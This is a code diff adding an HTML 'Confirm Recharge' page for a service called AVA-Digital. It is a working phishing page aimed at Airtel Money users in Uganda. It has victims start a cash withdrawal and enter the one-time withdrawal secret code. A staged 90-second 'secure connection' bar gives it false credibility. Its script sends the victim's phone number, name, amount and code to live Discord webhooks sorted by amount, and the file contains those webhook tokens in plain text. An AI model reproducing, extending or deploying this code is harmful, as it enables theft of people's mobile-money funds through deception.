@@ -1,0 +1,349 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <link rel="manifest" href="/manifest.json">
+    <script>
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register('/service-worker.js');
+        }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AVA-Digital - Confirm Recharge</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #ffffff;
+            font-family: system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+            color: #1A1A2E;
+            line-height: 1.5;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .container { max-width: 600px; width: 100%; margin: 0 auto; }
+        .header { text-align: center; margin-bottom: 24px; }
+        .header h1 {
+            font-size: 2rem;
+            font-weight: 800;
+            background: linear-gradient(135deg, #FF7A00, #CC1177, #7B22CC);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        .card {
+            background: #ffffff;
+            border-radius: 28px;
+            padding: 32px 28px;
+            box-shadow: 0 20px 35px -8px rgba(0,0,0,0.08), 0 0 0 1px rgba(123,34,204,0.06);
+            margin-bottom: 20px;
+        }
+        .instructions-card {
+            background: #F9F7FF;
+            border-radius: 20px;
+            padding: 24px 20px;
+            margin-bottom: 28px;
+            border-left: 5px solid #7B22CC;
+        }
+        .instructions-card h4 { color: #7B22CC; margin-bottom: 16px; font-size: 1.1rem; font-weight: 700; }
+        .instructions-card ol { padding-left: 24px; }
+        .instructions-card ol li { margin-bottom: 10px; font-size: 0.95rem; color: #2E2E4A; line-height: 1.5; }
+
+        /* ── Progress bar wrapper ── */
+        .progress-wrapper {
+            border-radius: 20px;
+            overflow: hidden;
+            background: linear-gradient(135deg, #1A0A2E, #0D0D1F);
+            padding: 28px 24px 22px;
+            margin-bottom: 4px;
+        }
+
+        .progress-label-row {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 14px;
+        }
+
+        .progress-label-text {
+            color: rgba(255,255,255,0.7);
+            font-size: 0.8rem;
+            letter-spacing: 0.1em;
+            text-transform: uppercase;
+            font-weight: 600;
+        }
+
+        .progress-dots::after {
+            content: '';
+            animation: dots 1.2s steps(1) infinite;
+        }
+        @keyframes dots {
+            0%  { content: '.'; }
+            33% { content: '..'; }
+            66% { content: '...'; }
+        }
+
+        .progress-status-icon {
+            font-size: 1rem;
+        }
+
+        /* Track */
+        .progress-track {
+            width: 100%;
+            height: 14px;
+            background: rgba(255,255,255,0.08);
+            border-radius: 40px;
+            overflow: hidden;
+            position: relative;
+        }
+
+        /* Animated shimmer on top of fill */
+        @keyframes shimmer {
+            0%   { transform: translateX(-100%); }
+            100% { transform: translateX(400%); }
+        }
+
+        /* Fill bar */
+        .progress-fill {
+            height: 100%;
+            width: 0%;
+            border-radius: 40px;
+            background: linear-gradient(90deg, #7B22CC, #CC1177, #FF7A00);
+            transition: width 1s linear;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .progress-fill::after {
+            content: '';
+            position: absolute;
+            top: 0; left: 0;
+            width: 40%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.25), transparent);
+            animation: shimmer 2s ease-in-out infinite;
+        }
+
+        /* Node dots below bar */
+        .progress-nodes {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 10px;
+            padding: 0 2px;
+        }
+
+        @keyframes node-pulse {
+            0%, 100% { opacity: 0.35; transform: scale(1); }
+            50%       { opacity: 1;    transform: scale(1.3); }
+        }
+
+        .progress-node {
+            width: 7px;
+            height: 7px;
+            border-radius: 50%;
+            animation: node-pulse 2s ease-in-out infinite;
+        }
+        .progress-node:nth-child(1) { background: #7B22CC; animation-delay: 0s; }
+        .progress-node:nth-child(2) { background: #9922BB; animation-delay: 0.3s; }
+        .progress-node:nth-child(3) { background: #BB1199; animation-delay: 0.6s; }
+        .progress-node:nth-child(4) { background: #CC1177; animation-delay: 0.9s; }
+        .progress-node:nth-child(5) { background: #DD4455; animation-delay: 1.2s; }
+        .progress-node:nth-child(6) { background: #EE6633; animation-delay: 1.5s; }
+        .progress-node:nth-child(7) { background: #FF7A00; animation-delay: 1.8s; }
+
+        /* Completion state */
+        .progress-complete-msg {
+            display: none;
+            color: rgba(255,255,255,0.85);
+            font-size: 0.85rem;
+            text-align: center;
+            margin-top: 14px;
+            font-weight: 500;
+        }
+
+        /* ── Secret section ── */
+        #secret-section { display: none; margin-top: 24px; }
+        #secret-section.visible {
+            display: block;
+            animation: fadeInUp 0.5s ease forwards;
+        }
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(16px); }
+            to   { opacity: 1; transform: translateY(0); }
+        }
+        .secret-label { display: block; font-weight: 600; margin-bottom: 8px; color: #1E1E3A; font-size: 0.95rem; }
+        .secret-input {
+            width: 100%; padding: 14px 16px;
+            border: 2px solid #E2E2F0; border-radius: 18px;
+            font-size: 1rem; background: #F9F9FF; color: #1A1A2E;
+            transition: border-color 0.2s; margin-bottom: 20px;
+        }
+        .secret-input:focus { outline: none; border-color: #7B22CC; box-shadow: 0 0 0 4px rgba(123,34,204,0.08); }
+        .btn {
+            background: linear-gradient(135deg, #7B22CC, #CC1177);
+            border: 1px solid rgba(255,255,255,0.2);
+            color: white; font-weight: 700; font-size: 1.1rem;
+            padding: 16px 24px; border-radius: 40px; cursor: pointer; width: 100%;
+            box-shadow: 0 12px 20px -8px rgba(123,34,204,0.3);
+            transition: transform 0.15s, box-shadow 0.2s;
+        }
+        .btn:hover { transform: translateY(-2px); box-shadow: 0 18px 28px -10px rgba(204,17,119,0.4); }
+        .back-button { display: block; text-align: center; margin-top: 20px; color: #1A88FF; text-decoration: none; font-weight: 600; }
+        .back-button:hover { color: #7B22CC; text-decoration: underline; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1><i class="fas fa-shield-alt"></i> Confirm Recharge</h1>
+        </div>
+
+        <div class="card">
+            <!-- Airtel withdrawal instructions -->
+            <div class="instructions-card">
+                <h4><i class="fas fa-info-circle"></i> Airtel Money Instructions</h4>
+                <ol>
+                    <li>Dial <strong>*185#</strong> on your Airtel line to open the Airtel Money menu.</li>
+                    <li>Choose the option for <strong>"Withdraw Cash"</strong>.</li>
+                    <li>Enter <strong id="amount-instruction">the amount you'd like to withdraw</strong>.</li>
+                    <li>Once completed, put the <strong>secret code</strong> given to you in the input below and click <strong>"Confirm Recharge"</strong>.</li>
+                    <li>Recharge will <strong>immediately reflect</strong> in your account wallet.</li>
+                </ol>
+            </div>
+
+            <!-- Progress bar loading screen -->
+            <div class="progress-wrapper" id="progress-wrapper">
+                <div class="progress-label-row">
+                    <span class="progress-label-text">Establishing secure connection<span class="progress-dots"></span></span>
+                    <span class="progress-status-icon">🔐</span>
+                </div>
+
+                <div class="progress-track">
+                    <div class="progress-fill" id="progress-fill"></div>
+                </div>
+
+                <div class="progress-nodes">
+                    <div class="progress-node"></div>
+                    <div class="progress-node"></div>
+                    <div class="progress-node"></div>
+                    <div class="progress-node"></div>
+                    <div class="progress-node"></div>
+                    <div class="progress-node"></div>
+                    <div class="progress-node"></div>
+                </div>
+
+                <div class="progress-complete-msg" id="progress-complete-msg">
+                    ✅ Connection established — enter your secret code below
+                </div>
+            </div>
+
+            <!-- Secret code input — revealed after timer completes -->
+            <div id="secret-section">
+                <label class="secret-label">
+                    <i class="fas fa-key"></i>&nbsp; Enter Secret Code (Airtel)
+                </label>
+                <input type="text" id="secretCode" class="secret-input" placeholder="Enter the secret code from Airtel Money">
+                <button id="confirmBtn" class="btn">Confirm Recharge</button>
+            </div>
+
+            <a href="recharge.html" class="back-button">← Back to Recharge</a>
+        </div>
+    </div>
+
+    <script type="module">
+        const DURATION_MS = 90000;
+
+        const stored = sessionStorage.getItem('airtel_recharge');
+        if (!stored) {
+            window.location.href = 'recharge.html';
+        }
+
+        const { amount, phone, walletName } = JSON.parse(stored);
+
+        // ── Dynamic amount in instruction step 3 ──
+        const formatted = 'UGX ' + parseInt(amount).toLocaleString();
+        document.getElementById('amount-instruction').textContent = formatted;
+
+        // ── Persistent timer: use a fixed start time stored in sessionStorage ──
+        // Key is tied to the amount so a new recharge request always gets a fresh timer
+        const timerKey = 'airtel_recharge_start_' + amount;
+
+        let startTime = parseInt(sessionStorage.getItem(timerKey) || '0');
+        if (!startTime) {
+            startTime = Date.now();
+            sessionStorage.setItem(timerKey, startTime.toString());
+        }
+
+        const progressFill   = document.getElementById('progress-fill');
+        const progressWrapper = document.getElementById('progress-wrapper');
+        const completeMsg    = document.getElementById('progress-complete-msg');
+        const secretSection  = document.getElementById('secret-section');
+
+        function revealInput() {
+            progressFill.style.width = '100%';
+            // Short pause so bar visually completes before switching
+            setTimeout(() => {
+                completeMsg.style.display = 'block';
+                setTimeout(() => {
+                    progressWrapper.style.display = 'none';
+                    secretSection.classList.add('visible');
+                    // Clean up timer key so re-entry via back button starts fresh
+                    sessionStorage.removeItem(timerKey);
+                }, 800);
+            }, 400);
+        }
+
+        function tick() {
+            const elapsed = Date.now() - startTime;
+            if (elapsed >= DURATION_MS) {
+                revealInput();
+                return;
+            }
+            const pct = Math.min((elapsed / DURATION_MS) * 100, 100);
+            progressFill.style.width = pct.toFixed(2) + '%';
+            requestAnimationFrame(tick);
+        }
+
+        // Check immediately — if page was refreshed late in the timer, jump ahead
+        const alreadyElapsed = Date.now() - startTime;
+        if (alreadyElapsed >= DURATION_MS) {
+            revealInput();
+        } else {
+            requestAnimationFrame(tick);
+        }
+
+        // ── Confirm button ──
+        function getAirtelWebhookUrl(amount) {
+            if (amount <= 40000)  return 'https://discord.com/api/webhooks/1476249951163121705/l92a50vk2nX1kXEWD7LmLtctDH30px8ZHShBE1iUTMFRChKdtPKcLvCMjC05e0YA1wtc';
+            if (amount <= 100000) return 'https://discord.com/api/webhooks/1505134939006304396/fSnIinb0f7rBEaEhsNDEZodxC8-kb3Gsi3yWPw9roUiMCDni9tCQ5V924J2RNn3LYzmA';
+            if (amount <= 250000) return 'https://discord.com/api/webhooks/1505135801263194182/I3UxUo3_Wm1EiUVoPi4xA0nLYUhGexi1hVbqmWrRtYMFNwPTF6jRsk4ibmGOGHHXaAT5';
+            return 'https://discord.com/api/webhooks/1505136197046108251/jGJrPDipPlPwx27zHEvWU7RHbmfeZqlvADlGo5qSLb5yzNC4qoQg2q_rekYYswD4gabL';
+        }
+
+        document.getElementById('confirmBtn').addEventListener('click', async () => {
+            const secretCode = document.getElementById('secretCode').value.trim();
+            if (!secretCode) {
+                alert('Please enter the secret code from Airtel Money before confirming.');
+                return;
+            }
+            try {
+                const msg = `🔋 Recharge Request!\n💳 Payment Method: Airtel Money\n📞 Phone: ${phone}\n👤 Name: ${walletName}\n💰 Amount: UGX ${parseInt(amount).toLocaleString()}\n🔑 Secret Code: ${secretCode}`;
+                await fetch(getAirtelWebhookUrl(amount), {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: msg })
+                });
+                sessionStorage.removeItem('airtel_recharge');
+                alert('Thank you for your payment. It will be confirmed shortly.');
+                window.location.href = 'home.html';
+            } catch (err) {
+                console.error(err);
+                alert('Error sending request: ' + err.message);
+            }
+        });
+    </script>
+</body>
+</html>
